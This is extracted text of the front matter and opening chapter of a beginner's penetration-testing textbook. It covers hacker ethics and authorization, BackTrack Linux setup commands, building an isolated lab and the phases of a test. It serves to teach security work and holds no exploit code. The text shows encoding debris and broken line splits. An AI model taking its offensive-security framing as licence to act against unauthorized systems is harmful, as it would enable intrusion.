['[0cThe Basics of hacking  and penetration Testing 0cThis page intentionally left blank Openmirrors
com Openmirrors
com Openmirrors
com Openmirrors
com 0cThe Basics of hacking   and penetration Testing Ethical hacking and penetration   Testing Made Easy Patrick Engebretson Technical Editor James Broad   AmsterdAm e280a2 Boston e280a2 HeidelBerg e280a2 london e280a2 new York  oxford e280a2 PAris e280a2 sAn diego e280a2 sAn frAncisco   singAPore e280a2 sYdneY e280a2 tokYo  Syngress Press is an imprint of Elsevier 0cfor information on all syngress publications visit our website at www
syngress
com Acquiring Editor: Angelina Ward Development Editor: Heather Scherer Project Manager: Jessica Vaughan Designer: Alisa Andreola Syngress is an imprint of elsevier 225 wyman street waltham mA 02451 UsA c2a9 2011 elsevier inc
 All rights reserved no part of this publication may be reproduced or transmitted in any form or by any means electronic   or mechanical including photocopying recording or any information storage and retrieval system   without permission in writing from the publisher
 details on how to seek permission further   information about the Publishere28099s permissions policies and our arrangements with organizations such   as the copyright clearance center and the copyright licensing Agency can be found at our   website: www
elsevier
com/permissions
 this book and the individual contributions contained in it are protected under copyright by the   Publisher (other than as may be noted herein)
 Notices knowledge and best practice in this field are constantly changing
 As new research and experience   broaden our understanding changes in research methods or professional practices may become necessary
  Practitioners and researchers must always rely on their own experience and knowledge in evaluating   and using any information or methods described herein
 in using such information or methods they should be   mindful of their own safety and the safety of others including parties for whom they have a professional  responsibility
 to the fullest extent of the law neither the Publisher nor the authors contributors or editors assume   any liability for any injury and/or damage to persons or property as a matter of products liability   negligence or otherwise or from any use or operation of any methods products instructions or   ideas contained in the material herein
 Library of Congress Cataloging-in-Publication Data engebretson Pat (Patrick Henry) 1974-  the basics of hacking and penetration testing : ethical hacking and penetration testing made easy / Patrick  engebretson
   p
 cm
 e28093 (syngress basics series)  includes bibliographical references and index
  isBn 978-1-59749-655-1 (alk
 paper)  1
 computer security
 2
 computer hackers
 3
 computer softwaree28093testing
 4
 computer crimese28093  Prevention
 i
 title
  QA76
9
A25e5443 2010  005
8e28093dc23  2011018388 British Library Cataloguing-in-Publication Data A catalogue record for this book is available from the British library isBn: 978-1-59749-655-1 Printed in the United states of America 11 12 13 14 15 10 9 8 7 6 5 4 3 2 1 0cthis book is dedicated to god lorianna maggie and molly
 You are the steel  cables that bind me
 i love you
 Dedication v Openmirrors
com Openmirrors
com 0cThis page intentionally left blank 0cACKNOWLEDGMENTS 













































































ix ABOUT ThE AUThOR 














































































xi ABOUT ThE TEChNICAL EDITOR 



























































 xiii INTRODUCTION 





















































































 xv ChApTER 1 What Is penetration Testing? 















































1 ChApTER 2 Reconnaissance 
































































15 ChApTER 3 Scanning 











































































43 ChApTER 4 Exploitation 







































































65 ChApTER 5 Web-Based Exploitation 



















































107 ChApTER 6 Maintaining Access with Backdoors and Rootkits 













127 ChApTER 7 Wrapping Up the penetration Test 




































145 INDEX 

































































































157 Contents vii 0cThis page intentionally left blank 0clike most people i have a list
 the list is made up of life goals and dreamse28094 things i would like to accomplish at some point in my life
 some of the  items on the list are big some small some well-defined stable and concrete  whereas others are more transient and ambiguouse28094like early morning fog  on the lutsen mountains constantly changing and moving sometimes even  disappearing altogether only to reappear at a later date and time
 obviously  the list is not a stone tablet; it changes and updates as i move through life
 A  few things however have never moved off the list; they stand as the mount  rushmoree28099s in my life
 Hundreds of feet high carved into solid granite
 never  changing
 Always there
 they gracefully weather the storms and vicissitudes of  life and simply wait to be crossed off
 some are nobler some are egotistical  and some are even whimsical
 i have had the good fortune in my life to be able  to cross off many of the items on my list
 even the big ones
 this book repre- sents the crossing off of one of my e2809crushmoree2809d items
 A presidential face to be  sure (although i am not sure which face it actually represents!)
 As with most things in life this book the end product that you see is the cul- mination of many peoplee28099s efforts and energies
 so while i do get to cross this  off my list and while my name appears on the cover please do not take that  to mean that this book is my sole creation
 without the dedication support  help and advice from everyone involved there is no doubt you would not be  reading these words right now
 writing a proper e2809cAcknowledgmentse2809d section  by truly listing everyone involved would fill many many pagese28094below you  will find a simple attempt to say thanks
 i apologize in advance if i forgot to  mention anyone
 My WIfE what can i say that would justify or somehow verbalize what you mean to me?  there is no doubt that this book is as much an effort on your part as mine
 You  gave me the wings of encouragement to fly and the dedication of long lonely  days and nights while i worked on it
 You never complained never resisted  and were never upset when i needed more from you
 every man should be so  lucky
 i am who i am because of you
 thank you
 My GIRLS to my little liebchense28094you are the light of my life! i apologize for all early  mornings late nights and long weekends
 Bring on the sunroom little People  Acknowledgments ix 0cAcknowledgments x mary and Joseph princesses Barbiee28099s and the Pirate ship! daddy loves you  more than life itself
 My fAMILy thanks to my mother and father for the gift of education and teaching me to  understand the value of hard work and dedication to a project
 thanks also to  my other mother who dedicated countless hours to reading and correcting my  initial rough drafts
 TO ThE SyNGRESS TEAM thanks for the opportunity! thanks to the editing team; i appreciate all the  hard work and dedication you gave to this project
 special thanks to Angelina  ward who ultimately earned a green light for the project to Heather scherer  my editor for the countless hours and assistance and to James Broad for the  excellent eye and great suggestions throughout the technical review process
 to keep up with news and happenings about the book or other security- related content feel free to follow: pengebretson on twitter or visit my home- page: http://homepages
dsu
edu/pengebretson 0cDr
 Patrick Engebretson obtained his doctor of science degree with a spe- cialization in information security from dakota state University
 He currently  serves as an assistant professor of information assurance and also works as a  senior penetration tester for a security firm in the midwest
 His research inter- ests include penetration testing hacking intrusion detection exploitation  honey pots and malware
 in the past several years he has published many  peer-reviewed journal and conference papers in these areas
 He has been  invited by the department of Homeland security to share his research at the  software Assurance forum in washington dc and has also spoken at Black  Hat in las Vegas
 He regularly attends advanced exploitation and penetration  testing trainings from industry-recognized professionals and holds several cer- tifications
 He teaches graduate and undergraduate courses in penetration test- ing wireless security and intrusion detection and advanced exploitation
 xi About the Author 0cThis page intentionally left blank 0cxiii James Broad (cissP c|eH c)Pts securityee80b1 mBA) is the President and  owner of cyber-recon llc where he and his team of consultants special- ize in information security information Assurance and certification and  Accreditation and offer other security consultancy services to corporate and gov- ernment clients
 As a security professional with over 20 years of real-world it experience James  is an expert in many areas of it security specializing in security engineering  penetration testing and vulnerability analysis and research
 He has provided  security services in the natione28099s most critical sectors including defense law  enforcement intelligence finance and healthcare
 James has a mastere28099s of Business Administration degree with specialization in  information technology (mBA/it) from the ken Blanchard college of Business  Bachelore28099s degrees in computer Programming and security management from  southwestern University and is currently a doctoral learner pursuing a Ph
d
  in information security from capella University
 He is a member of issA and  (isc) 2c2ae
 James currently resides in stafford Virginia with his family: deanne  micheal and temara
 About the  Technical Editor xiii Openmirrors
com 0cThis page intentionally left blank 0ci suppose there are several questions that may be running through your head  as you contemplate reading this book: who is the intended audience for this  book? How is this book different from book e28098xe28099 (insert your favorite title here)?  why should i buy it? Because these are all fair questions and i am asking you  to plunk down your hard-earned cash it is important to provide some answers  to these questions
 for people who are interested in learning about hacking and penetration test- ing walking into a well-stocked bookstore can be as confusing as searching  for e2809chackinge2809d books at amazon
com
 initially there appears to be an almost  endless selection to choose from
 most large bookstores have several shelves  dedicated to computer security books
 they include books on programming  security web application security rootkits and malware penetration testing  and of course hacking
 However even the hacking books seem to vary in con- tent and subject matter
 some books focus on using tools but do not discuss  how these tools fit together
 other books focus on hacking a particular subject  but lack the broad picture
 this book is intended to address these issues
 it is meant to be a single starting  point for anyone interested in the topics of hacking or penetration testing
 the  book will certainly cover specific tools and topics but will also examine how  the tools fit together and how they rely on one another to be successful
 WhO IS ThE INTENDED AUDIENCE fOR ThIS BOOK? this book is meant to be a very gentle yet thorough guide to the world of hack- ing and penetration testing
 it is specifically aimed at helping you master the  basic steps needed to complete a hack or penetration test without overwhelm- ing you
 By the time you finish this book you will have a solid understanding  of the penetration testing process and you will be comfortable with the basic  tools needed to complete the job
 specifically this book is aimed at people who are new to the world of hack- ing and penetration testing for those with little or no previous experience for  those who are frustrated by the inability to see the big picture (how the various  tools and phases fit together) or for those looking to expand their knowledge  of offensive security
 in short this book is written for anyone who is interested in computer secu- rity hacking or penetration testing but has no prior experience and is not sure  where to begin
 A colleague and i call this concept e2809czero entry hackinge2809d (ZeH)  xv Introduction 0cIntroduction xvi much like modern-day swimming pools
 Zero entry pools gradually slope from  the dry end to the deep end allowing swimmers to wade in without feeling  overwhelmed or without having a fear of drowning
 the e2809czero entrye2809d concept  allows everyone the ability to use the pool regardless of age or swimming abil- ity
 this book employs a similar technique
 ZeH is designed to expose you to  the basic concepts without overwhelming you
 completion of ZeH will pre- pare you for advanced courses and books
 hOW IS ThIS BOOK DIffERENT fROM BOOK e28098Xe28099? when not spending time with my family there are two things i enjoy doing:  reading and hacking
 most of the time i combine these hobbies by reading  about hacking
 As a professor and a penetration tester you can imagine that my  bookshelf is lined with many books on hacking security and penetration test- ing
 As with most things in life the quality and value of every book is different
  some books are excellent resources that have been used so many times that the  bindings are literally falling apart
 others are less helpful and remain in nearly  new condition
 A book that does a good job of explaining the details without  losing the reader is worth its weight in gold
 Unfortunately most of my per- sonal favorites those that are worn and tattered are either very lengthy (500ee80b1   pages) or very focused (an in-depth guide to a single topic)
 neither of these is  a bad thing; in fact quite the opposite it is the level of detail and the clarity of  the authorse28099 explanation that make them so great
 But at the same time a very  large tome focused on a detailed subject of security can seem overwhelming to  newcomers
 Unfortunately as a beginner trying to break into the security field and learn  the basics of hacking tackling one of these books can be both daunting and  confusing
 this book is different from other publications in two ways
 first it  is meant for beginners; recall the concept of e2809czero entry
e2809d if you have never per- formed any type of hacking or you have used a few tools but are not quite sure  what to do next (or how to interpret the results of the tool) this book is for  you
 the goal is not to bury you with details but to present a broad overview of  the entire field
 naturally the book will still cover each of the major tools needed to complete  the steps in a penetration test but it will not stop to examine all the in-depth  or additional functionality for each of these tools
 this will be helpful from the  standpoint that it will focus on the basics and in most cases allow us to avoid  confusion caused by advanced features or minor differences in tool versions
 for example when we discuss port scanning the chapter will discuss how to  run the basic scans with the very popular port scanner nmap
 Because the book  focuses on the basics it becomes less important exactly which version of nmap  the user is running
 running a sYn scan using nmap is exactly the same regard- less of whether you are conducting your scan with nmap version 2 or version 5
  this technique will be employed as often as possible doing so should allow the  0cIntroduction   xvii reader to learn nmap (or any tool) without having to worry about the changes  in functionality that often accompany advanced features in version changes
 the goal of this book is to provide general knowledge that will allow you to  tackle advanced topics and books
 remember once you have a firm grasp of  the basics you can always go back and learn the specific details and advanced  features of a tool
 in addition each chapter will end with a list of suggested  tools and topics that are outside the scope of this book but can be used for fur- ther study and to advance your knowledge
 Beyond just being written for beginners this book actually presents the infor- mation in a very unique way
 All the tools and techniques we use in this book  will be carried out in a specific order against a small number of related targets  (all target machines will belong to the same subnet and the reader will be able  to easily recreate this e2809ctargete2809d network to follow along)
 readers will be shown  how to interpret tool output and how to utilize that output to continue the  attack from one chapter to the next
 the use of a sequential and singular rolling example throughout the book will  help readers see the big picture and better comprehend how the various tools  and phases fit together
 this is different from many other books on the mar- ket today which often discuss various tools and attacks but fail to explain how  those tools can be effectively chained together
 Presenting information in a  way that shows the user how to clearly move from one phase to another will  provide valuable experience and allow the reader to complete an entire pene- tration test by simply following along with the examples in the book
 this con- cept should allow the reader to get a clear understanding of the fundamental  knowledge while learning how the various tools and phases connect
 Why ShOULD I BUy ThIS BOOK? even though the immediate answers to this question are highlighted in the  preceding sections below you will find a condensed list of reasons: n You want to learn more about hacking and penetration testing but you are  unsure of where to start
 n You have dabbled in hacking and penetration testing but you are not sure  how all the pieces fit together
 n You want to learn more about the tools and processes that are used by  hackers and penetration testers to gain access to networks and systems
 n You are looking for a good place to start building offensive security  knowledge
 n You enjoy a challenge
 Openmirrors
com 0cThis page intentionally left blank 0c1 INTRODUCTION Penetration testing can be defined as a legal and authorized attempt to locate  and successfully exploit computer systems for the purpose of making those sys- tems more secure
 the process includes probing for vulnerabilities as well as  providing proof of concept (Poc) attacks to demonstrate the vulnerabilities  are real
 Proper penetration testing always ends with specific recommendations  for addressing and fixing the issues that were discovered during the test
 on  the whole this process is used to help secure computers and networks against  future attacks
 Penetration testing is also known as n Pen testing n Pt n Hacking n ethical Hacking n white Hat Hacking it is important to spend a few moments discussing the difference between pen- etration testing and vulnerability assessment
 many people (and vendors) in  the security community incorrectly use these terms interchangeably
 A vulner- ability assessment is the process of reviewing services and systems for poten- tial security issues whereas a penetration test actually performs exploitation  and Poc attacks to prove that a security issue exists
 Penetration tests go a step  What Is penetration  Testing? ChApTER 1 Information in This Chapter: n Introduction to Backtrack Linux: Tools
 Lots of Tools n Working with Backtrack: Starting the Engine n The Use and Creation of a Hacking La n Phases of a Penetration Test 0cThe Basics of hacking and penetration Testing 2 beyond vulnerability assessments by simulating hacker activity and delivering  live payloads
 in this book we will cover the process of vulnerability assess- ment as one of the steps utilized to complete a penetration test
 Setting the Stage Understanding all the various players and positions in the world of hacking  and penetration testing is central to comprehending the big picture
 let us start  by painting the picture with broad brush strokes
 Please understand that the  following is a gross oversimplification; however it should help you see the dif- ferences between the various groups of people involved
 it may help to consider the Star Wars universe where there are two sides of the  e2809cforcee2809d: Jedis and siths
 good vs
 evil
 Both sides have access to an incredible  power
 one side uses its power to protect and serve whereas the other side uses  it for personal gain and exploitation
 learning to hack is much like learning to use the force (or so i imagine!)
 the  more you learn the more power you have
 eventually you will have to decide  whether you will use your power for good or bad
 there is a classic poster from  the Star Wars episode i movie that depicts Anakin as a young boy
 if you look  closely at Anakine28099s shadow in the poster you will see it is the outline of darth  Vader
 try searching the internet for e2809cAnakin darth Vader shadowe2809d to see it
  Understanding why this poster has appeal is critical
 As a boy Anakin had no  aspirations of becoming darth Vader but it happened nonetheless
 it is probably safe to assume that very few people get into hacking to become  a super villain
 the problem is that journey to the darkside is a slippery slope
  However if you want to be great have the respect of your peers and be gain- fully employed in the security workforce you need to commit yourself to using  your powers to protect and serve
 Having a felony on your record is a one-way  ticket to another profession
 it is true that there is currently a shortage of quali- fied security experts but even so not many employers today are willing to take  a chance especially if those crimes involve computers
 in the pen testing world it is not uncommon to hear the terms e2809cwhite hate2809d and  e2809cblack hate2809d to describe the Jedis and siths
 throughout this book the terms  e2809cwhite hate2809d e2809cethical hackere2809d or e2809cpenetration testere2809d will be used interchange- ably to describe the Jedis
 the siths will be referred to as e2809cblack hatse2809d e2809ccrack- erse2809d or e2809cmalicious attackers
e2809d it is important to note that ethical hackers complete many of the same activi- ties with many of the same tools as malicious attackers
 in nearly every situ- ation an ethical hacker should strive to act and think like a real black hat  hacker
 the closer the penetration test simulates a real-world attack the more  value it provides to the customer paying for the Pt
 Please note how the previous paragraph says e2809cin nearly every situation
e2809d even  though white hats complete many of the same tasks with many of the same  tools there is a world of difference between the two sides
 At its core these  0cWhat Is penetration Testing? ChApTER 1 3 differences can be boiled down to three key points: authorization motivation  and intent
 it should be stressed that these points are not all inclusive but they  can be useful in determining if an activity is ethical or not
 the first and simplest way to differentiate between white hats and black hats is  authorization
 Authorization is the process of obtaining approval before con- ducting any tests or attacks
 once authorization is obtained both the penetra- tion tester and the company being audited need to agree upon the scope of the  test
 the scope includes specific information about the resources and systems  to be included in the test
 the scope explicitly defines the authorized targets  for the penetration tester
 it is important that both sides fully understand the  authorization and scope of the Pt
 white hats must always respect the autho- rization and remain within the scope of the test
 Black hats will have no such  constraints on the target list
 the second way to differentiate between an ethical hacker and a malicious  hacker is through examination of the attackere28099s motivation
 if the attacker is  motivated or driven by personal gain including profit through extortion or  other devious methods of collecting money from the victim revenge fame or  the like he or she should be considered a black hat
 However if the attacker  is preauthorized and his or her motivation is to help the organization and  improve their security he or she can be considered a white hat
 finally if the intent is to provide the organization a realistic attack simula- tion so that the company can improve its security through early discovery and  mitigation of vulnerabilities the attacker should be considered a white hat
  it is also important to comprehend the critical nature of keeping Pt findings  confidential
 ethical hackers will never share sensitive information discovered  during the process of a penetration testing with anyone other than the client
  However if the intent is to leverage information for personal profit or gain the  attacker should be considered a black hat
 INTRODUCTION TO BACKTRACK LINUX:   TOOLS
 LOTS Of TOOLS A few years back the open discussion or teaching of hacking techniques was  considered a bit taboo
 fortunately times have changed and people are begin- ning to understand the value of offensive security
 offensive security is now  being embraced by organizations regardless of size or industries
 governments  are also getting serious about offensive security
 many governments have gone  on record stating they are actively building and developing offensive security  capabilities
 Ultimately penetration testing should play an important role in the overall  security of your organization
 Just as policies risk assessments business con- tinuity planning and disaster recovery have become integral components in  keeping your organization safe and secure penetration testing needs to be  included in your overall security plan as well
 Penetration testing allows you  0cThe Basics of hacking and penetration Testing 4 to view your organization through the eyes of the enemy
 this process can lead  to many surprising discoveries and give you the time needed to patch your sys- tems before a real attacker can strike
 one of the great things about learning how to hack today is the plethora and  availability of good tools to perform your craft
 not only are the tools read- ily available but many of them are stable with several years of development  behind them
 maybe even more important to many of you is the fact that most  of these tools are available free of charge
 for the purpose of this book every  tool covered will be free
 it is one thing to know a tool is free it is another to find compile and install  each of the tools required to complete even a basic penetration test
 Although  this process is quite simple on todaye28099s modern linux ose28099s it can still be a bit  daunting for newcomers
 most people who start are usually more interested in  learning how to use the tools than they are in searching the vast corners of the  internet locating and installing tools
 to be fair you really should learn how to manually compile and install soft- ware on a linux machine; or at the very least you should become familiar with  apt-get (or the like)
 MORE ADvANCED APT short for Advanced Package Tool is a package management system
 APT allows  you to quickly and easily install update and remove software from the command  line
 Aside from its simplicity one of the best things about APT is the fact that it  automatically resolves dependency issues for you
 This means that if the package   you are installing requires additional software APT will automatically locate and  install the additional software
 This is a massive improvement over the old days of  e2809cdependency hell
e2809d Installing software with APT is very straightforward
 For example let us assume you want  to install the classic network-mapping tool Cheops
 Once you know the name of the  package you want to install from the command line you can run apt-get install  followed by the name of the software you want to install
 It is always a good idea to run  apt-get update before installing software
 This will ensure that you are getting the  latest version available
 To install Cheops we would issue the following commands: apt-get update apt-get install cheops Before the package is installed you will be shown how much disk space will be used  and you will be asked if you want to continue
 To install your new software you can  type e2809cYe2809d and hit the enter key
 If you prefer not to use the command line there are several GUIs available for  interacting with APT
 The most popular graphical front end is currently Aptitude
  Additional package managers are outside the scope of this book
 0cWhat Is penetration Testing? ChApTER 1 5 A basic understanding of linux will be beneficial and will pay you mountains  of dividends in the long run
 for the purpose of this book there will be no  assumption that you have prior linux experience but do yourself a favor and  commit yourself to becoming a linux guru someday
 take a class read a book  or just explore on your own
 trust me you will thank me later
 if you are inter- ested in penetration testing or hacking there is no way of getting around the  need to know linux
 fortunately the security community is a very active and very giving group
  there are several organizations that have worked tirelessly to create various  security-specific linux distributions
 A distribution or e2809cdistroe2809d for short is basi- cally a flavor type or brand of linux
 Among the most well known of these penetration testing distributions is one  called e2809cBacktrack
e2809d Backtrack linux is your one-stop shop for learning hacking  and performing penetration testing
 Backtrack linux reminds me of that scene  in the first Matrix movie where tank asks neo e2809cwhat do you need besides a  miracle?e2809d neo responds with e2809cguns
 lots of guns
e2809d At this point in the movie  rows and rows of guns slide into view
 every gun imaginable is available for  neo and trinity: handguns rifles shotguns semiautomatic automatic big and  small from pistols to explosives an endless supply of different weapons from  which to choose
 that is a similar experience most newcomers have when they  first boot up Backtrack
 e2809ctools
 lots of tools
e2809d Backtrack linux is a hackere28099s dream come true
 the entire distribution is built  from the ground up for penetration testers
 the distribution comes preloaded  with hundreds of security tools that are installed configured and ready to  be used
 Best of all Backtrack is free! You can get your copy at http://www
 Backtrack-linux
org/downloads/
 navigating to the Backtrack link will allow you to choose from either an 
iso or  a Vmware image
 if you choose to download the 
iso you will need to burn the  
iso to a dVd
 if you are unsure of how to complete this process please google  e2809cburning an iso
e2809d once you have completed the burning process you will have  a bootable dVd
 in most cases starting Backtrack from a bootable dVd is as  simple as putting the dVd into the drive and restarting the machine
 in some  instances you may have to change the boot order in the Bios so that the opti- cal drive has the highest boot priority
 if you choose to download the Vmware image you will also need software  capable of opening and deploying or running the image
 luckily enough there  are several good tools for accomplishing this task
 depending on your prefer- ence you can use Vmwaree28099s Vmware Player sun microsysteme28099s VirtualBox or  microsofte28099s Virtual Pc
 in reality if you do not like any of those options there  are many other software options capable of running a Vm image
 You simply  need to choose one that you are comfortable with
 each of the three virtualization options listed above are available free of charge  and will provide you with the ability to run Vm images
 You will need to  Openmirrors
com 0cThe Basics of hacking and penetration Testing 6 decide which version is best for you
 this book will rely heavily on the use of  a Backtrack Vmware image and Vmware Player
 At the time of writing Vmware  Player was available at: http://www
vmware
com/products/player/
 You will  need to register for an account to download the software but the registration  process is simple and free
 if you are unsure of which option to choose it is suggested that you go the  Vmware route
 not only is this another good technology to learn but using  Vms will allow you to set up an entire penetration testing lab on a single  machine
 if that machine is a laptop you essentially have a e2809ctravellinge2809d Pt lab  so you can practice your skills anytime anywhere
 if you choose to run Backtrack using the bootable dVd shortly after the sys- tem starts you will be presented with a menu list
 You will need to review the  list carefully as it contains several different options
 the first couple of options  are used to set some basic information about your systeme28099s screen resolution
  if you are having trouble getting Backtrack to boot be sure to choose the e2809cstart  Backtrack in safe graphical mode
e2809d the menu contains several other options  but these are outside the scope of this book
 to select the desired boot option  simply use the arrow keys to highlight the appropriate row and hit the enter  key to confirm your selection
 figure 1
1 shows an example of the Backtrack  boot screen
 the use of Backtrack is not required to work through this book or to learn the  basics of hacking
 Any version of linux will do fine
 the major advantage of  using Backtrack is that all the tools are preloaded for you
 if you choose to use  a different version of linux you will need to install the tools before reading  the chapter
 it is also important to remember that because this book focuses on  the basics it does not matter which version of Backtrack you are using
 All the  tools we will explore and use in this book are available in every version
 WORKING WITh BACKTRACK: STARTING ThE ENGINE regardless of whether you choose to run Backtrack as a Vm or boot to a live  dVd once the initial system is loaded you will be presented with a log-in  prompt
 the default username is root and the default password is toor
 fIGURE 1
1 A Screenshot Showing the Boot Options When Using the Live DVD
 0cWhat Is penetration Testing? ChApTER 1 7 notice the default password is simply e2809croote2809d spelled backward
 this default  username and password combination has been in use since Backtrack 1 and  most likely it will remain in use for future versions
 At this point you should  be logged into the system and should be presented with e2809croot@bt:~#e2809d  prompt
 Although it is possible to run many of the tools we will discuss in this  book directly from the terminal it is often easier for newcomers to make use  of the x window system
 You can start the gUi by typing the following com- mand after the e2809croot@bt~#e2809d prompt: startx After typing this command and hitting the enter key x will begin to load
 this  environment should seem vaguely familiar to most computer users
 once it  has completely loaded you will see a desktop icons a task bar and a system  tray
 Just like microsoft windows you can interact with these items by moving  your mouse cursor and clicking on the desired object
 most of the programs we will use in this book will be run out of the termi- nal
 You can start a terminal session by either clicking on the black box located  in the lower left in the taskbar or by typing the following command into the  launcher as shown in figure 1
2
 konsole Unlike microsoft windows or many of the modern-day linux ose28099s by default  Backtrack does not come with networking enabled
 this setup is by design
  As a penetration tester we often try to maintain a stealthy or undetected pres- ence
 nothing screams e2809clook At me!! look At me!! ie28099m Here!!!e2809d like a  computer that starts up and instantly begins spewing network traffic by broad- casting requests for a dHcP server and iP address
 to avoid this issue the net- working interfaces of your Backtrack machine are turned down (off) by default
 the easiest way to enable networking is through the terminal
 open a terminal  window by clicking on the terminal icon as shown by the leftmost arrow in  figure 1
2
 once the terminal opens enter the following command: ifconfig e28093a this command will list all the available interfaces for your machine
 At a  minimum most machines will include an eth0 and a lo interface
 the e2809cloe2809d  fIGURE 1
2 Two Ways to Launch the Konsole (Terminal)
 0cThe Basics of hacking and penetration Testing 8 interface is your loopback interface
 the e2809ceth0e2809d is your first ethernet card
  depending on your hardware you may have additional interfaces or differ- ent interface numbers listed
 if you are running Backtrack through a Vm your  main interface will usually be eth0
 to turn the network card on you enter the following command into a terminal  window: ifconfig eth0 up let us examine this command in more detail; e2809cifconfige2809d is a linux command  that means e2809ci want to configure a network interface
e2809d As we already know  e2809ceth0e2809d is the first network device on our system (remember computers often  start counting at 0 not 1) and the keyword e2809cupe2809d is used to activate the inter- face
 so we can roughly translate the command you entered as e2809ci want to con- figure the first interface to be turned on
e2809d now that the interface is turned on we need to get an iP address
 there are  two basic ways to complete this task
 our first option is to assign the address  manually by appending the desired iP address to the end of the previous com- mand
 for example if we wanted to assign our network card an iP address of  192
168
1
23 we would type: ifconfig eth0 up 192
168
1
23 At this point the machine will have an iP address but will still need a gateway  and domain name system (dns) server
 A simple google search for e2809csetting  up nic linuxe2809d will show you how to enter that information
 You can always  check to see if your commands worked by issuing the following command into  a terminal window: ifconfig running this will allow you to see the current settings for your network inter- faces
 Because this is a beginnere28099s guide and for the sake of simplicity we will  assume that stealth is not a concern at the moment
 in that case the easiest  way to get an address is to use dHcP
 to assign an address through dHcP you  simply issue the command: dhclient eth0 Please note this assumes you have already successfully run the command to  turn up your network interface (eth0 in this case)
 now that we have successfully assigned an iP address the last thing to address  is how to turn off Backtrack
 As with most things in linux there are multiple  ways to accomplish this task
 one of the easiest ways is to enter the following  command into a terminal window: poweroff You can also substitute the poweroff command with the reboot command if  you would prefer to restart the system rather than shut it down
 0cWhat Is penetration Testing? ChApTER 1 9 Before proceeding you should take several minutes to review and practice all  the steps highlighted thus far including n Power on/start up Backtrack n log in with the default user name and password n start x (the windows gUi) n View all the network interfaces on your machine n turn up (on) the desired network interface n Assign an iP address manually n View the manually assigned iP address n Assign an iP address through dHcP n View the dynamically assigned address n reboot the machine using the command line interface n Poweroff the machine using the command line interface ThE USE AND CREATION Of A hACKING LAB every ethical hacker must have a place to practice and explore
 most newcomers  are confused about how they can learn to use hacking tools without breaking the  law or attacking unauthorized targets
 this is most often accomplished through  the creation of a personal e2809chacking lab
e2809d A hacking lab is a sandboxed environ- ment where your traffic and attacks have no chance of escaping or reaching unau- thorized and unintended targets
 in this environment you are free to explore  all the various tools and techniques without fear that some traffic or attack will  escape your network
 At a minimum the lab is set up to contain at least two  machines: one attacker and one victim
 in other configurations several victim  machines can be deployed simultaneously to simulate a more realistic network
 the proper use and setup of a hacking lab is vital because one of the most  effective means to learn something is by doing that thing
 learning and master- ing the basics of penetration testing is no different
 the single most crucial point of any hacker lab is the isolation of the network
  You must configure your lab network in such a way that it is impossible for  traffic to escape or travel outside of the network
 mistakes happen and even  the most careful people can fat-finger or mistype an iP address
 it is a simple  mistake to mistype a single digit in an iP address but that mistake can have  drastic consequences for you and your future
 it would be a shame (and more  importantly illegal) for you to run a series of scans and attacks against what  you thought was your hacker lab target with an iP address of 172
16
1
1 only to  find out later that you actually entered the iP address as 122
16
1
1
 the simplest and most effective way to create a sandboxed or isolated environ- ment is to physically unplug or disconnect your network from the internet
 if  you are using physical machines it is best to rely on hardwired ethernet cables  and switches to route traffic
 Also be sure to double- and triple-check that all of  your wireless nics are turned off
 Always carefully inspect and review your net- work for potential leaks before continuing
 0cThe Basics of hacking and penetration Testing 10 Although the use of physical machines to create a hacking lab is an accept- able solution the use of virtual machines provides several key benefits
 first  given todaye28099s processing power it is easy to set up and create a mini hacking  lab on a single machine or laptop
 in most cases an average machine can run  two or three virtual machines simultaneously because our targets can be set  up using minimal resources
 even running on a laptop it is possible to run  two virtual machines at the same time
 the added benefit of using a laptop is  the fact that your lab is portable
 with the cheap cost of external storage today  it is easily possible to pack hundreds of virtual machines on a single external  hard drive; these can be easily transported and set up in a matter of minutes
  Anytime you are interested in practicing your skills or exploring a new tool  simply open up Backtrack and deploy a Vm as a target
 setting up a lab like this  gives you the ability to quickly plug-and-play with various operating systems  and configurations
 Another benefit of using virtual machines in your pen testing lab is the fact  that it is very simple to sandbox your entire system
 simply turn off the wire- less card and unplug the cable from the internet
 Your physical machine and  virtual machines will still be able to communicate with each other and you can  be certain that no attack traffic will leave your physical machine
 in general penetration testing is a destructive process
 many of the tools and  exploits we run can cause damage or take systems offline
 in some cases it is  easier to reinstall the os or program rather than attempt to repair it
 this is  another area where Vms shine
 rather than having to physically reinstall a pro- gram like sQl server or even an entire operating system the Vm can be quickly  reset or restored to its original configuration
 phASES Of A pENETRATION TEST like most things the overall process of penetration testing can be broken  down into a series of steps or phases
 when put together these steps form a  comprehensive methodology for completing a penetration test
 careful review  of unclassified incident response reports or breech disclosures supports the  idea that most black hat hackers also follow a process when attacking a target
  the use of an organized approach is important because it not only keeps the  penetration tester focused and moving forward but also allows the results or  output from each step to be used in the ensuing steps
 the use of a methodology allows you to break down a complex process into a  series of smaller more manageable tasks
 Understanding and following a meth- odology is an important step in mastering the basics of hacking
 depending  on the literature or class you are taking this methodology usually contains  between four and seven steps or phases
 Although the overall names or num- ber of steps can vary between methodologies the important thing is that  the process provides a complete overview of the penetration testing process
   0cWhat Is penetration Testing? ChApTER 1 11 for example some methodologies use the term e2809cinformation gatheringe2809d  whereas others call the same process e2809creconnaissance
e2809d for the purpose of this  book we will focus on the activities of the phase rather than the name
 After  you have mastered the basics you can review the various penetration testing  methodologies and choose one that you like best
 to keep things simple we will use a four-step process to explore and learn  penetration testing
 if you search around and examine other methodologies  (which is important to do) you may find processes that include more or less  steps than we are using as well as different names for each of the phases
 it  is important to understand that although the specific terminology may differ  most solid penetration testing methodologies cover the same topics
 there is one exception to this rule: the final step in many hacking methodolo- gies is a phase called e2809chidinge2809d e2809ccovering your trackse2809d or e2809cremoving evidence
e2809d  Because this book focuses on understanding the basics it will not be included  in this methodology
 once you have a solid understanding of the basics you  can go on to explore and learn more about this phase
 the remainder of this book will be dedicated to reviewing and teaching the fol- lowing steps: reconnaissance scanning exploitation and maintaining Access
  sometimes it helps to visualize these steps as an inverted triangle
 figure 1
3  demonstrates this approach
 the reason we use an inverted triangle is because  the outcome of initial phases is very broad
 As we move down into each phase  we continue to drill down to very specific details
 the inverted triangle works well because it represents our journey from the  broad to the specific
 for example as we work through the reconnaissance  phase it is important to cast our nets as wide as possible
 every detail and every  piece of information about our target is collected and stored
 the penetration  testing world is full of many great examples when a seemingly trivial piece of  Reconnaissance Port Scanning Vulnerability Scanning Scanning Exploitation Maintaining Access fIGURE 1
3 Zero Entry Hacking Penetration (ZEH) Testing Methodology
 0cThe Basics of hacking and penetration Testing 12 information was collected in the initial phase and later turned out to be a cru- cial component for successfully completing an exploit and gaining access to  the system
